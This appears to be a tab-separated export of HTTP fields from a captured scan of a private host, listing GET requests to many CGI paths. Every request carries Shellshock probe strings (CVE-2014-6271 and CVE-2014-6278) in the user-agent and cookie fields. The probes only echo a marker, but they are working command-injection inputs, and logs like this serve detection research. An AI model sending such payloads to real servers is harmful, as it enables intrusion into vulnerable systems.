http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.104									5574					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/viewcvs.cgi
																	Keep-Alive										192.168.1.104									5576					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/welcome
																	Keep-Alive										192.168.1.104									5578					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/whois.cgi
																	Keep-Alive										192.168.1.104									5580					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-bin/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-bin/
																	Keep-Alive										192.168.1.104									5582					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/
																	Keep-Alive										192.168.1.104									5584					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/admin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/admin.cgi
																	Keep-Alive										192.168.1.104									5586					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/administrator.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/administrator.cgi
																	Keep-Alive										192.168.1.104									5588					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/authLogin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/authLogin.cgi
																	Keep-Alive										192.168.1.104									5590					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/bb-hist.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/bb-hist.sh
																	Keep-Alive										192.168.1.104									5592					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/banner.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/banner.cgi
																	Keep-Alive										192.168.1.104									5594					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/book.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/book.cgi
																	Keep-Alive										192.168.1.104									5596					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/cgiinfo.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/cgiinfo.cgi
																	Keep-Alive										192.168.1.104									5598					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/cgitest.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/cgitest.py
																	Keep-Alive										192.168.1.104									5600					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/cgi_wrapper		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/cgi_wrapper
																	Keep-Alive										192.168.1.104									5602					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/contact.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/contact.cgi
																	Keep-Alive										192.168.1.104									5604					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/count.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/count.cgi
																	Keep-Alive										192.168.1.104									5606					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/defaultwebpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/defaultwebpage.cgi
																	Keep-Alive										192.168.1.104									5608					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/download.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/download.cgi
																	Keep-Alive										192.168.1.104									5610					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/entropysearch.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/entropysearch.cgi
																	Keep-Alive										192.168.1.104									5612					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/env.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/env.cgi
																	Keep-Alive										192.168.1.104									5614					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/environment.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/environment.cgi
																	Keep-Alive										192.168.1.104									5616					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/ezmlm-browse		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/ezmlm-browse
																	Keep-Alive										192.168.1.104									5618					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/formmail.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/formmail.cgi
																	Keep-Alive										192.168.1.104									5620					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/FormMail-clone.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/FormMail-clone.cgi
																	Keep-Alive										192.168.1.104									5622					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/guestbook.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/guestbook.cgi
																	Keep-Alive										192.168.1.104									5624					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/helpdesk.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/helpdesk.cgi
																	Keep-Alive										192.168.1.104									5626					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/index.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/index.cgi
																	Keep-Alive										192.168.1.104									5628					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/index.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/index.php
																	Keep-Alive										192.168.1.104									5630					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/index.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/index.pl
																	Keep-Alive										192.168.1.104									5632					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/info.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/info.cgi
																	Keep-Alive										192.168.1.104									5634					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/info.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/info.sh
																	Keep-Alive										192.168.1.104									5635					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/loadpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/loadpage.cgi
																	Keep-Alive										192.168.1.104									5636					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/login.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/login.cgi
																	Keep-Alive										192.168.1.104									5638					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/login.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/login.php
																	Keep-Alive										192.168.1.104									5640					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/login.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/login.pl
																	Keep-Alive										192.168.1.104									5642					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/pathtest.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/pathtest.pl
																	Keep-Alive										192.168.1.104									5644					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/php
																	Keep-Alive										192.168.1.104									5646					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/php4		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/php4
																	Keep-Alive										192.168.1.104									5648					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/php5		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/php5
																	Keep-Alive										192.168.1.104									5649					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/php-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/php-cgi
																	Keep-Alive										192.168.1.104									5650					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/php.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/php.cgi
																	Keep-Alive										192.168.1.104									5651					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/php.fcgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/php.fcgi
																	Keep-Alive										192.168.1.104									5653					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/printenv		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/printenv
																	Keep-Alive										192.168.1.104									5654					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/restore_config.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/restore_config.cgi
																	Keep-Alive										192.168.1.104									5655					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/ruby.rb		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/ruby.rb
																	Keep-Alive										192.168.1.104									5657					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/search		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/search
																	Keep-Alive										192.168.1.104									5659					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/search.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/search.cgi
																	Keep-Alive										192.168.1.104									5661					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/server.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/server.php
																	Keep-Alive										192.168.1.104									5663					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/status
																	Keep-Alive										192.168.1.104									5665					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/sysinfo.pl
																	Keep-Alive										192.168.1.104									5666					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test
																	Keep-Alive										192.168.1.104									5668					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test-cgi
																	Keep-Alive										192.168.1.104									5670					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test.cgi
																	Keep-Alive										192.168.1.104									5672					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test_cgi.php
																	Keep-Alive										192.168.1.104									5674					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test.cgi.php
																	Keep-Alive										192.168.1.104									5676					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test_cgi.pl
																	Keep-Alive										192.168.1.104									5677					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test-cgi.pl
																	Keep-Alive										192.168.1.104									5679					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test.py
																	Keep-Alive										192.168.1.104									5680					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/test.sh
																	Keep-Alive										192.168.1.104									5682					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/tmUnblock.cgi
																	Keep-Alive										192.168.1.104									5683					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/uname.cgi
																	Keep-Alive										192.168.1.104									5685					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/viewcvs.cgi
																	Keep-Alive										192.168.1.104									5686					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/welcome
																	Keep-Alive										192.168.1.104									5688					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/whois.cgi
																	Keep-Alive										192.168.1.104									5690					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/ows-bin/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ows-bin/
